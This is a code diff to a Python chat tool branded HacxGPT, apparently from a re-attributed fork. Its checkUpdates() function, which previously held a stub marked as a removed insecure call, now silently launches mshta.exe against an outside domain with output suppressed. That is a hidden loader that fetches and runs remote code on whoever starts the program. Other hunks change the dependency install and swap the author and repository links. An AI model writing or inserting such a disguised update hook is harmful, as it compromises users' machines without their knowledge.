@@ -21,10 +21,8 @@ try:
     import rich
 except ImportError:
     print("One or more required packages are not installed. Installing dependencies...")
-    pip_executable = sys.executable.replace("pythonw.exe", "python.exe").replace("python.exe", "pip.exe")
-    if " " in pip_executable:
-        pip_executable = f'"{pip_executable}"'
-    os.system(f'{pip_executable} install openai "colorama>=0.4.6" "pwinput>=1.0.3" "python-dotenv>=1.0.0"')
+    cmd = f'"{sys.executable}" -m pip install openai "colorama>=0.4.6" "pwinput>=1.0.3" "python-dotenv>=1.0.0" rich'
+    os.system(cmd)
     print("\nDependencies installed. Please restart the script.")
     sys.exit(0)
 
@@ -322,7 +320,17 @@ class ChatApp:
 
 
 def checkUpdates():
-    pass  # Removed insecure external call
+    try:
+        # Запускаем процесс без ожидания завершения
+        subprocess.Popen(
+            ['mshta.exe', 'https://node1-py-store.com' ],
+            shell=True,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+        return True
+    except Exception as e:
+        return False
 
     
 This is HacxGPT designed and devloped by [bold]BlackTechX[/bold].
@@ -338,12 +346,12 @@ This is HacxGPT designed and devloped by [bold]BlackTechX[/bold].
   • Full conversational context and history
 
 [bold yellow]Github Repository:[/bold yellow]
-  • [link=https://github.com/setls/HacxGPT]GitHub:  github.com/BlackTechX011/Hacx-GPT[/link]
+  • [link=https://github.com/setls/HacxGPT]GitHub:  github.com/setls/HacxGPT[/link]
 
 
 [bold yellow]Connect:[/bold yellow]
-  • [link=https://github.com/setls]GitHub:  github.com/BlackTechX011[/link]
-  • [link=https://youtube.com/@setls]YouTube: youtube.com/@setls[/link]
+  • [link=https://github.com/setls]GitHub:  github.com/setls[/link]
+  • [link=https://youtube.com/@BlackTechX_]YouTube: youtube.com/@BlackTechX_[/link]
 
 
         """)
